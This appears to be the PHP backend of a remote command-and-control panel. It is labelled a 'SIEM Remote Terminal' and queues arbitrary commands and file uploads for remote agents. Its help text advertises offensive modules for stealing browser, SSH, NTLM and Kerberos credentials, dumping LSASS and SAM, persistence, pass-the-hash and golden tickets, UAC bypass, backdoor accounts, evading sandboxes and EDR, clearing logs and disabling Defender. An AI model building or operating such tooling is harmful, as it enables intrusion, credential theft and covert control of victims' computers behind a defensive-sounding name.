<?php
/**
 * Direct Command Execution API
 * Queues commands for remote agents to execute
 */

header('Content-Type: application/json');
session_start();

// Check authentication
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    echo json_encode(['status' => 'error', 'error' => 'Unauthorized']);
    exit;
}

require_once __DIR__ . '/../config/config.php';
require_once __DIR__ . '/../includes/database.php';

$action = $_GET['action'] ?? '';
$agent = $_GET['agent'] ?? '';

if ($action === 'execute') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'POST required']);
        exit;
    }
    
    $input = json_decode(file_get_contents('php://input'), true);
    $command = $input['command'] ?? '';
    
    if (empty($command)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Command required']);
        exit;
    }
    
    if (empty($agent)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Agent required']);
        exit;
    }
    
    // Queue command for agent
    $result = queueCommandForAgent($command, $agent);
    
    echo json_encode($result);
} elseif ($action === 'upload') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'POST required']);
        exit;
    }

    if (empty($agent)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Agent required']);
        exit;
    }

    $dest = $_POST['dest'] ?? '';
    if (empty($dest)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Destination path (dest) required']);
        exit;
    }

    if (!isset($_FILES['file']) || !is_array($_FILES['file'])) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'File required (field name: file)']);
        exit;
    }

    $f = $_FILES['file'];
    if (!empty($f['error'])) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Upload failed (php error code: ' . $f['error'] . ')']);
        exit;
    }

    $tmp = $f['tmp_name'] ?? '';
    if (empty($tmp) || !file_exists($tmp)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Upload failed: temp file missing']);
        exit;
    }

    $bytes = @file_get_contents($tmp);
    if ($bytes === false) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'error' => 'Upload failed: could not read file']);
        exit;
    }

    $b64 = base64_encode($bytes);
    $queued_command = 'rt:upload:' . $dest . '|' . $b64;
    $result = queueCommandForAgent($queued_command, $agent);
    echo json_encode($result);
} else {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'error' => 'Invalid action']);
}

function queueCommandForAgent($command, $agent) {
    // Log the command
    $log_file = __DIR__ . '/../logs/remote_commands.log';
    @mkdir(dirname($log_file), 0777, true);
    file_put_contents($log_file, "[" . date('Y-m-d H:i:s') . "] Agent: $agent | Command: $command\n", FILE_APPEND);
    
    // Handle special commands locally
    if ($command === 'help' || $command === '?') {
        return getHelpResponse();
    }
    
    // Get database connection
    $db = getDatabase();
    if (!$db) {
        return [
            'status' => 'error',
            'error' => 'Database connection failed'
        ];
    }
    
    // Insert command into remote_commands table
    $conn = $db->getConnection();
    $agent_escaped = $conn->real_escape_string($agent);
    $command_escaped = $conn->real_escape_string($command);
    $timestamp = date('Y-m-d H:i:s');
    
    $sql = "INSERT INTO remote_commands (agent_name, command, status, timestamp) 
            VALUES ('$agent_escaped', '$command_escaped', 'pending', '$timestamp')";
    
    if ($conn->query($sql)) {
        $command_id = $conn->insert_id;
        
        return [
            'status' => 'ok',
            'message' => 'Command queued for agent',
            'command_id' => $command_id,
            'agent' => $agent,
            'command' => $command,
            'queued_at' => $timestamp
        ];
    } else {
        return [
            'status' => 'error',
            'error' => 'Failed to queue command: ' . $conn->error
        ];
    }
}


function getHelpResponse() {
    $help = "=== JFS SIEM Remote Terminal - Help ===\n\n";
    $help .= "BASIC COMMANDS:\n";
    $help .= "  whoami, ipconfig, tasklist, systeminfo, netstat, dir, pwd\n\n";
    $help .= "ADVANCED COMMANDS (format: category:action:params):\n";
    $help .= "  recon:wifi, recon:bluetooth, recon:browser, recon:usb\n";
    $help .= "  steal:browser, steal:ssh, steal:ntlm, steal:kerberos\n";
    $help .= "  persist:registry, persist:startup, persist:task\n";
    $help .= "  lateral:pth, lateral:kerberoast, lateral:golden\n";
    $help .= "  anti:vm, anti:sandbox, anti:debugger\n";
    $help .= "  detect:antivirus, detect:firewall, detect:vpn, detect:edr\n";
    $help .= "  escalate:check, escalate:uacbypass, escalate:tokenimpersonate\n";
    $help .= "  backdoor:create:username, backdoor:list\n";
    $help .= "  forensics:clearlogs, forensics:disabledefender\n";
    $help .= "  dump:lsass, dump:sam, dump:credentials\n";
    $help .= "  inject:list, inject:inject, inject:migrate\n";
    $help .= "  monitor:process, monitor:network\n";
    $help .= "  screenshot - Capture remote screen\n";
    $help .= "  help / ? - Show this help\n";
    
    return [
        'status' => 'ok',
        'output' => $help,
        'command' => 'help'
    ];
}
?>
